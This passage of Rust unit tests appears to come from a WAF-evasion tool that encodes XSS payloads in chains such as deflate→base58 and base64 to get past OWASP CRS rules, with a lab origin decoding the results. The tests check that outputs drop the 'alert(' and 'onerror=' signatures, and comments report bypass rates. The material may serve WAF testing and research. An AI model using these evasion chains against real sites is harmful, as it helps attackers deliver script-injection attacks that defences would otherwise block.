        // carry special chars CRS's character rules can count — measurably > 0,
        // which is why they bypass PL4 less reliably than the clean trio. (b64url
        // is intentionally NOT asserted here: its `-`/`_` only appear when a
        // 6-bit group hits index 62/63, so its count is payload-dependent — the
        // very reason its bench bypass sits at ≈89%, between clean and base64.)
        for dirty in ["b64", "b32"] {
            assert!(
                pl4_special_chars(&enc(dirty)) > 0,
                "{dirty} must carry special chars"
            );
        }
        assert_eq!(pl4_special_chars(""), 0);
    }

    // ── --transform-chain parser: operator-facing pipeline grammar ───────────

    #[test]
    fn parse_chain_builds_innermost_first_pipeline() {
        assert_eq!(
            parse_chain("deflate.hex").unwrap(),
            vec![Stage::Deflate, Stage::Hex]
        );
        assert_eq!(
            parse_chain("b64.b64").unwrap(),
            vec![Stage::B64, Stage::B64]
        );
        assert_eq!(parse_chain("b58").unwrap(), vec![Stage::B58]);
    }

    #[test]
    fn parse_chain_matches_the_named_catalog_equivalents() {
        // The chain grammar must reproduce the hand-named composites exactly —
        // proof the catalog rows ARE just pinned chains. `deflate.hex` ≡ zhex,
        // `deflate.b64` ≡ zb64, `b64.b64` ≡ b64x2.
        for (chain, name) in [
            ("deflate.hex", "zhex"),
            ("deflate.b64", "zb64"),
            ("b64.b64", "b64x2"),
        ] {
            let via_chain = encode_stages(&parse_chain(chain).unwrap(), P);
            assert_eq!(
                via_chain,
                enc(name),
                "chain `{chain}` must equal catalog `{name}`"
            );
        }
    }

    #[test]
    fn parse_chain_tolerates_whitespace_and_empty_segments() {
        assert_eq!(
            parse_chain("  deflate . hex  ").unwrap(),
            vec![Stage::Deflate, Stage::Hex]
        );
    }

    #[test]
    fn parse_chain_unknown_stage_is_error_naming_token_and_valid_set() {
        let err = parse_chain("deflate.nope").unwrap_err();
        assert!(err.contains("nope"), "must name the bad token: {err}");
        assert!(err.contains("deflate"), "must list the valid set: {err}");
    }

    #[test]
    fn parse_chain_empty_is_error() {
        assert!(parse_chain("").is_err());
        assert!(parse_chain("   ").is_err());
        assert!(parse_chain("..").is_err());
    }

    #[test]
    fn parse_chain_rejects_binary_terminal_stage() {
        // THE AUDIT GUARD: a pipeline ending in `deflate` emits raw bytes; left
        // unchecked it would panic encode_stages' UTF-8 finalisation on operator
        // input. parse_chain must reject it with the fix in the message.
        for bad in ["deflate", "hex.deflate", "b64.deflate"] {
            let err = parse_chain(bad).unwrap_err();
            assert!(
                err.contains("must end in a text stage") && err.contains("deflate"),
                "binary-terminal chain `{bad}` must fail closed with the fix: {err}"
            );
        }
        // And the validated chains never panic encode_stages (the invariant the
        // guard enforces) — exercise a few terminal-encoder shapes.
        for ok in ["deflate.hex", "deflate.b64", "deflate.b58", "rot13", "b32"] {
            let _ = encode_stages(&parse_chain(ok).unwrap(), P); // must not panic
        }
    }

    #[test]
    fn stage_token_round_trips_through_from_token() {
        for tok in stage_token_names() {
            let s = Stage::from_token(tok).expect("known token");
            assert_eq!(s.token(), tok, "token round-trip must be stable for {tok}");
        }
    }

    #[test]
    fn pipeline_generalises_beyond_the_catalog() {
        // The Stage machinery is general: an ad-hoc clean-alphabet chain the
        // catalog doesn't ship (deflate → base58) still round-trips. Proves the
        // axis is composition, not a fixed list — a future `--transform-chain`
        // can mix primitives without new bespoke encoders.
        let e = encode_stages(&[Stage::Deflate, Stage::B58], P);
        // base58-decode then zlib-inflate.
        use flate2::read::ZlibDecoder;
        use std::io::Read;
        let raw = b58_decode_bytes(&e);
        let mut z = ZlibDecoder::new(&raw[..]);
        let mut out = String::new();
        z.read_to_string(&mut out).expect("valid zlib stream");
        assert_eq!(out, P);
        // Clean alphabet end-to-end: no base64 special chars to trip CRS PL4.
        assert!(!e.contains('+') && !e.contains('/') && !e.contains('='));
    }

    // Byte-returning base58 decoder for the generalisation test.
    fn b58_decode_bytes(s: &str) -> Vec<u8> {
        const A: &[u8; 58] = b"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
        let zeros = s.bytes().take_while(|&c| c == b'1').count();
        let mut bytes: Vec<u8> = Vec::new();
        for c in s.bytes() {
            let mut carry = A.iter().position(|&a| a == c).expect("valid b58 char") as u32;
            for b in bytes.iter_mut() {
                carry += (*b as u32) * 58;
                *b = (carry & 0xff) as u8;
                carry >>= 8;
            }
            while carry > 0 {
                bytes.push((carry & 0xff) as u8);
                carry >>= 8;
            }
        }
        let mut out = vec![0u8; zeros];
        out.extend(bytes.iter().rev());
        out
    }

    // ── resolve / catalog ────────────────────────────────────────────────────

    #[test]
    fn resolve_all_returns_every_transform_in_order() {
        let got = resolve("all").unwrap();
        let names: Vec<_> = got.iter().map(|t| t.name).collect();
        assert_eq!(names, all_names());
    }

    #[test]
    fn resolve_comma_list_preserves_catalog_order_not_input_order() {
        // Input order is intentionally scrambled; output follows catalog order
        // so reports and sweeps are deterministic.
        let got = resolve("hex,b64").unwrap();
        let names: Vec<_> = got.iter().map(|t| t.name).collect();
        assert_eq!(names, vec!["b64", "hex"]);
    }

    #[test]
    fn resolve_dedups_repeated_names() {
        let got = resolve("b64,b64,hex,b64").unwrap();
        assert_eq!(got.len(), 2);
    }

    #[test]
    fn resolve_unknown_name_is_error_naming_the_token() {
        let err = resolve("b64,nope").unwrap_err();
        assert!(err.contains("nope"), "error must name the bad token: {err}");
        assert!(err.contains("b64"), "error must list the valid set: {err}");
    }

    #[test]
    fn resolve_empty_or_whitespace_is_error() {
        assert!(resolve("").is_err());
        assert!(resolve("   ").is_err());
        assert!(resolve(",,").is_err());
    }

    #[test]
    fn catalog_names_are_unique() {
        let mut seen = std::collections::HashSet::new();
        for t in APP_TRANSFORMS {
            assert!(seen.insert(t.name), "duplicate transform name: {}", t.name);
        }
    }

    #[test]
    fn every_transform_has_a_nonempty_stage_pipeline() {
        // A row with no stages would emit the raw payload (a signature the WAF
        // catches) — fail closed against that.
        for t in APP_TRANSFORMS {
            assert!(
                !t.stages.is_empty(),
                "transform {} has an empty stage pipeline",
                t.name
            );
        }
    }

    #[test]
    fn every_transform_has_a_matching_origin_ctx() {
        // The ctx each transform names must be one the lab origin actually
        // decodes — guards against a transform whose decoder doesn't exist.
        let origin_ctxs = [
            "b64", "hex", "b32", "rot13", "jsesc", "entity", "zb64", "zhex", "b58", "b64x2", "b62",
            "zrawb64",
        ];
        for t in APP_TRANSFORMS {
            assert!(
                origin_ctxs.contains(&t.ctx),
                "transform {} names ctx {} with no origin decoder",
                t.name,
                t.ctx
            );
        }
    }

    #[test]
    fn every_encoder_strips_the_alert_signature() {
        // The whole point: no transform's output may carry a literal the WAF's
        // XSS rules match. (rot13 keeps angle brackets but loses the keywords,
        // which is what slips the regex/libinjection scoring.)
        for t in APP_TRANSFORMS {
            let e = t.encode(P);
            assert!(
                !e.contains("alert(") && !e.contains("onerror="),
                "transform {} leaked a signature token: {e}",
                t.name
            );
        }
    }
}
